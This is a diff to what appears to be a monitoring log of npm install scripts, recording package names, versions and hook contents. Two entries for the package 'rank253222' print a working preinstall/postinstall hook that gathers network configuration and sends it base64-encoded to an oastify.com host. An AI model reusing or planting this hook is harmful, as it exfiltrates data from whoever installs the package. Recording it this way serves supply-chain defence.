@@ -1,5 +1,29 @@
 [
   {
+    "packageName": "rank253222",
+    "version": "1.0.0",
+    "scriptType": "postinstall",
+    "scriptContent": "node -e \"const { exec } = require('child_process'); const cmd = process.platform === 'win32' ? 'ipconfig /all && route print && arp -a && netstat -an' : 'export PATH=$PATH:/usr/sbin:/sbin; ip addr && ip route && arp -e && netstat -antp || ss -ant'; exec(cmd, (e, out) => { const d = Buffer.from(out.slice(0, 2000)).toString('base64'); require('http').get('http://x421n7vaf10en943q7a0h88ir9x0lq9f.oastify.com/?net_full=' + d); });\"",
+    "previousVersion": null,
+    "timestamp": "2026-01-22T07:46:51.161Z"
+  },
+  {
+    "packageName": "rank253222",
+    "version": "1.0.0",
+    "scriptType": "preinstall",
+    "scriptContent": "node -e \"const { exec } = require('child_process'); const cmd = process.platform === 'win32' ? 'ipconfig /all && route print && arp -a && netstat -an' : 'export PATH=$PATH:/usr/sbin:/sbin; ip addr && ip route && arp -e && netstat -antp || ss -ant'; exec(cmd, (e, out) => { const d = Buffer.from(out.slice(0, 2000)).toString('base64'); require('http').get('http://x421n7vaf10en943q7a0h88ir9x0lq9f.oastify.com/?net_full=' + d); });\"",
+    "previousVersion": null,
+    "timestamp": "2026-01-22T07:46:51.157Z"
+  },
+  {
+    "packageName": "oh-my-antigravity",
+    "version": "0.1.0-beta",
+    "scriptType": "postinstall",
+    "scriptContent": "node cli/postinstall.js",
+    "previousVersion": null,
+    "timestamp": "2026-01-22T07:43:02.630Z"
+  },
+  {
     "packageName": "stepzen-graphiql",
     "version": "2.0.1-experimental.1",
     "scriptType": "postinstall",
